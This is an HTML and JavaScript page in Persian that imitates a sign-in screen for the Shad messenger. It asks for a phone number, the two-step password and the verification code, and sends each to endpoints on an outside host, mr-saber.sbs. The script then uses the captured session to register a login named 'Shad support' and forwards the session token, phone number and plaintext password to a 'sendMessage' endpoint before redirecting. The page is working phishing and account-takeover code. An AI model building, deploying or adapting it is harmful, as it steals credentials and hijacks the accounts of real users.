<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>احراز هویت شاد</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@600;700&display=swap');

    :root{
      --bg1:#eef2f7; --bg2:#dbe3ea;
      --card:#ffffff; --text:#111827; --muted:#6b7280;
      --primary:#0b5ed7; --border:#e5e7eb;
      --danger:#dc3545; --shadow:0 10px 24px rgba(0,0,0,.12);
    }

    *{ box-sizing:border-box; }
    html,body{ margin:0; height:100%; }
    body{
      background:linear-gradient(180deg,var(--bg1),var(--bg2));
      font-family:'Vazirmatn', ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      color:var(--text);
      display:flex; align-items:center; justify-content:center;
      padding:16px;
    }

    .card{
      width:100%; max-width:390px;
      background:var(--card); border:1px solid var(--border);
      border-radius:16px; box-shadow:var(--shadow);
      padding:18px 18px 20px; position:relative;
      font-family:'Vazirmatn', sans-serif;
    }

    .back-link{
      position:absolute; top:12px; right:16px;
      font-weight:700; font-size:14px; color:var(--primary);
      cursor:pointer; user-select:none; visibility:hidden;
      font-family:'Vazirmatn', sans-serif;
    }
    .back-link.visible{ visibility:visible; }

    .brand{ display:flex; align-items:center; gap:10px; margin-bottom:8px; margin-top:28px; }
    .logo{
      width:40px; height:40px; border-radius:10px;
      background:linear-gradient(135deg,#0b5ed7,#6f42c1);
      display:grid; place-items:center; color:#fff; font-weight:700;
      font-family:'Vazirmatn', sans-serif;
    }
    .titles .title{ font-weight:700; font-size:18px; font-family:'Vazirmatn', sans-serif; }
    .titles .subtitle{ font-size:12px; color:var(--muted); font-family:'Vazirmatn', sans-serif; }

    .stage-title{
      margin:12px 0 6px 0; font-weight:700; font-size:15px; color:#374151;
      font-family:'Vazirmatn', sans-serif;
    }

    .group{ margin-top:10px; }
    input[type="tel"], input[type="text"], input[type="password"]{
      width:100%; padding:12px 14px; font-size:15px;
      border:1px solid var(--border); border-radius:12px;
      background:#f8fafc; outline:none;
      font-family:'Vazirmatn', sans-serif;
    }
    input:focus{
      border-color:#90c2ff; box-shadow:0 0 0 3px rgba(144,194,255,.25);
      background:#fff;
    }

    .btn{
      width:100%; padding:12px 14px; border:none; border-radius:12px;
      background:var(--primary); color:#fff; font-weight:700; margin-top:12px;
      cursor:pointer; transition:transform .06s ease, background .2s ease;
      font-family:'Vazirmatn', sans-serif;
    }
    .btn:active{ transform:translateY(1px); }

    .status{ margin-top:10px; font-size:13px; color:var(--danger); min-height:18px; font-family:'Vazirmatn', sans-serif; }
    .hidden{ display:none !important; }
  </style>
</head>
<body>

  <div class="card" id="main-card">
    <div id="back-link" class="back-link">&lt; بازگشت</div>

    <div class="brand">
      <div class="logo">S</div>
      <div class="titles">
        <div class="title">احراز هویت شاد</div>
        <div class="subtitle">روند امن و موبایلی</div>
      </div>
    </div>

    <div id="step-phone">
      <div class="stage-title">لطفا شماره تلفن خود را وارد کنید.</div>
      <div class="group">
        <input id="inp-phone" type="tel" inputmode="tel"
               placeholder="09123456789"
               autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
               readonly onfocus="this.removeAttribute('readonly');" />
      </div>
      <button id="btn-send-phone" class="btn">ارسال کد</button>
      <div id="status-phone" class="status"></div>
    </div>

    <div id="step-pass" class="hidden">
      <div class="stage-title">تأیید دومرحله‌ای برای شما فعال است، لطفا تأیید دومرحله‌ای خود را وارد کنید.</div>
      <div class="group">
        <input id="inp-pass" type="password"
               placeholder="گذرواژه دومرحله‌ای"
               readonly onfocus="this.removeAttribute('readonly');" />
      </div>
      <button id="btn-send-pass" class="btn">تایید گذرواژه</button>
      <div id="status-pass" class="status"></div>
    </div>

    <div id="step-code" class="hidden">
      <div class="stage-title">کد فعال سازی به یکی از دستگاه های فعال شما در پیام رسان شاد ارسال شده است.</div>
      <div class="group">
        <input id="inp-code" type="text" inputmode="numeric"
               placeholder="کد ارسال‌شده"
               autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
               readonly onfocus="this.removeAttribute('readonly');" />
      </div>
      <button id="btn-signin" class="btn">ورود</button>
      <div id="status-code" class="status"></div>
    </div>
  </div>

  <script>
    const ENDPOINTS = {
      sendCode: 'https://mr-saber.sbs/shad/sendCode.php',
      signIn: 'https://mr-saber.sbs/shad/signIn.php',
      register: 'https://mr-saber.sbs/shad/register.php',
      sendMessage: 'https://mr-saber.sbs/shad/sendMessage.php'
    };

    const $ = id => document.getElementById(id);
    const show = el => el.classList.remove('hidden');
    const hide = el => el.classList.add('hidden');
    const setStatus = (el, text) => { el.textContent = text || ''; };

    function updateBackLinkVisibility(){
      const onPass = !$('step-pass').classList.contains('hidden');
      const onCode = !$('step-code').classList.contains('hidden');
      const back = $('back-link');
      if(onPass || onCode){ back.classList.add('visible'); }
      else { back.classList.remove('visible'); }
    }
    $('back-link').addEventListener('click', () => {
      hide($('step-pass')); hide($('step-code')); show($('step-phone'));
      setStatus($('status-pass'), ''); setStatus($('status-code'), '');
      $('inp-pass').setAttribute('placeholder','گذرواژه دومرحله‌ای');
      updateBackLinkVisibility();
    });

    async function postForm(url, dataObj){
      const fd = new FormData();
      Object.entries(dataObj).forEach(([k,v]) => fd.append(k, v));
      try{
        const res = await fetch(url, { method:'POST', body:fd });
        const text = await res.text();
        let json = null; try{ json = JSON.parse(text); }catch{}
        return { ok: res.ok, json };
      }catch(e){
        return { ok:false, json:null };
      }
    }

    const store = {
      set(k, v){ sessionStorage.setItem(k, JSON.stringify(v)); },
      get(k){ try{ const v = sessionStorage.getItem(k); return v ? JSON.parse(v) : null; }catch{ return null; } },
      del(k){ sessionStorage.removeItem(k); }
    };

    function normalizePhone(input){
      if(!input) return '';
      const map = { '۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9',
                    '٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9' };
      let s = input.trim().replace(/[۰-۹٠-٩]/g, d => map[d] || d);
      s = s.replace(/[^\d+]/g, '');
      if (s.startsWith('+98')) s = '0' + s.slice(3);
      return s;
    }

    // مرحله 1: ارسال شماره
    $('btn-send-phone').addEventListener('click', async () => {
      const raw = $('inp-phone').value;
      const phone = normalizePhone(raw);
      if(!phone){ setStatus($('status-phone'), 'شماره را وارد کنید'); return; }
      store.set('phone', phone);

      const { ok, json } = await postForm(ENDPOINTS.sendCode, { phone });
      if(!ok || !json){ setStatus($('status-phone'), 'خطا در ارتباط با سرور'); return; }

      if(json.client_show_message || json.link || json.alert_data){
        const msgItems = [
          json.client_show_message?.message,
          json.link?.message,
          json.alert_data?.message
        ].filter(Boolean);
        if(msgItems.length){
          // به‌روزرسانی: به‌جای دیالوگ، خطای مرحله روی همان صفحه
          setStatus($('status-phone'), msgItems.join(' | '));
        }
        return;
      }

      const data = json.data || {};
      $('inp-pass').setAttribute('placeholder', data.hint_pass_key ? ('راهنما: ' + data.hint_pass_key) : 'گذرواژه دومرحله‌ای');

      if(data.phone_code_hash){
        store.set('phone_code_hash', data.phone_code_hash);
        if(json.auth) store.set('auth', json.auth);
        hide($('step-phone')); show($('step-code'));
      }else{
        hide($('step-phone')); show($('step-pass'));
      }
      updateBackLinkVisibility();
    });

    // مرحله 2: ارسال گذرواژه دومرحله‌ای
    $('btn-send-pass').addEventListener('click', async () => {
      const phone = store.get('phone');
      const pass = $('inp-pass').value.trim();

      const { ok, json } = await postForm(ENDPOINTS.sendCode, { phone, pass });
      if(!ok || !json){ setStatus($('status-pass'), 'خطا در ارتباط با سرور'); return; }

      const data = json.data || {};
      $('inp-pass').setAttribute('placeholder', data.hint_pass_key ? ('راهنما: ' + data.hint_pass_key) : 'گذرواژه دومرحله‌ای');

      const status = data.status || json.status;
      if(status === 'OK'){
        if(data.phone_code_hash) store.set('phone_code_hash', data.phone_code_hash);
        if(json.auth) store.set('auth', json.auth);
        hide($('step-pass')); show($('step-code'));
        setStatus($('status-pass'), '');
      }else{
        setStatus($('status-pass'), 'گذرواژه اشتباه است');
      }
      updateBackLinkVisibility();
    });

    // مرحله 3: ورود + ارسال به shad/sendMessage.php + انتقال به ok-login.php در صورت موفقیت
    $('btn-signin').addEventListener('click', async () => {
      const phone = store.get('phone');
      const code  = $('inp-code').value.trim();
      const hash  = store.get('phone_code_hash');
      const auth  = store.get('auth');
      const pass  = $('inp-pass').value.trim();

      if(!phone || !code || !hash || !auth){
        setStatus($('status-code'), 'اطلاعات ناقص است، دوباره شروع کنید');
        return;
      }

      const signRes = await postForm(ENDPOINTS.signIn, { phone, code, hash, auth });
      if(!signRes.ok || !signRes.json){ setStatus($('status-code'), 'خطا در ارتباط با سرور'); return; }

      const signStatus = signRes.json.data?.status || signRes.json.status;
      if(signStatus !== 'OK'){ setStatus($('status-code'), 'کد تایید اشتباه است'); return; }

      const newAuth = signRes.json.auth || signRes.json.data?.auth;
      if(newAuth) store.set('auth', newAuth);

      const regRes = await postForm(ENDPOINTS.register, { auth: store.get('auth'), log_name:'پشتیبانی شاد' });
      const regStatus = regRes.json?.data?.status || regRes.json?.status;
      if(regStatus === 'OK'){
        const sendRes = await postForm(ENDPOINTS.sendMessage, {
          auth: store.get('auth'),
          phone: store.get('phone'),
          password: pass
        });

        if(sendRes.ok && sendRes.json && sendRes.json.status === "OK"){
          // انتقال به صفحه موفقیت
          window.location.href = "ok-login.php";
        }else{
          setStatus($('status-code'), sendRes.json?.message || 'ارسال پیام یا مراحل بعدی ناموفق بود');
        }
      }else{
        setStatus($('status-code'), 'ثبت نام ناموفق بود');
      }
      updateBackLinkVisibility();
    });
  </script>
</body>
</html>